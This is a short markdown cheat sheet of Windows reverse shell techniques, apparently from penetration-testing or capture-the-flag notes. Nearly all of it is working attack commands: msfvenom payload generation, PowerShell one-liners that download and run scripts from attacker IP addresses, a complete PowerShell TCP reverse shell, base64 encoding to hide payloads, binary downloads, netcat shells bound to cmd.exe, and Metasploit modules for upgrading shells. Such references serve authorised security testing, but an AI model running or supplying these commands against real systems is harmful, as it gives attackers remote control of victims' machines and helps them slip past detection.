# Reverse Shell

## Batch file

```
msfvenom -p cmd/windows/reverse_powershell lhost=192.168.1.109 lport=4444 > 1.bat

powershell -c "IEX((New-Object System.Net.WebClient).DownloadString('http://192.168.1.109/1.bat'))
```

## Nishang / Powershell

Retrieve Invoke-PowerShellTcp.ps1 from the Nishang collection.

Edit the script and add the execution line at the end with IP and PORT

```
c:\Windows\SysNative\WindowsPowershell\v1.0\powershell.exe IEX(New-Object Net.WebClient).downloadString('http://IP/Invoke-PoweShellTcp.ps1')
```

### Powershell reverse one liner

```
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('your-vpn-ip-addr',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

For encoding the payload for powershell

```
cat oneliner.ps1($client...) | iconv -t utf-16le | base64 -w 0

powershell -enc encoded_payload

OR

c:\windows\system32\cmd.exe /c powershell -enc encoded_payload

```

### Powershell download and execution

```
powershell iex (New-Object Net.WebClient).DownloadString('http://10.11.9.134:8000/PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress 10.11.9.134 -Port 9001

OR

"powershell -c iex(new-object net.webclient).downloadstring('http://10.10.14.45:5555/shell.ps1')"
```

```
powershell "(New-Object System.Net.WebClient).Downloadfile('http://10.11.9.134:8000/bruce.exe','bruce.exe')"
```

```
powershell -c "Invoke-WebRequest -Uri 'http://10.11.9.134:8000/bruce.exe' -OutFile 'C:\Windows\Temp\shell.exe'"
```

```
.\shell.exe
or
PS> & 'msdeploy.exe'
```

## Netcat reverse shell

Upload nc.exe onto the target's machine (take note if 32 or 64 bits)

```
nc.exe -nv IP PORT -e cmd.exe
nc64.exe -e cmd IP PORT
```

## Upgrade shell

### MSFconsole

```
use multi/manage/shell_to_meterpreter

or 

use exploit/windows/local/payload_inject
```